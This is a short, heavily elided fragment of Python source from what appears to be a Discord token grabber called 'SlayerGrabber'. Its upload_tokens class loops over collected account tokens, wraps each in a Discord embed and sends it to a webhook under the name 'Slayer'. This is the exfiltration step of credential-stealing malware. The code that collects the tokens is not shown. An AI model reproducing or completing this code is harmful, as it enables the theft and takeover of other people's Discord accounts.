...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed.set_footer(text="github.com/NotNukerOffical/SlayerGrabber")

            self.webhook.send(embed=embed, username="Slayer", avatar_url="https://cdn.discordapp.com/attachments/1083268388853383199/1083279360540283000/Slayer.jpg")
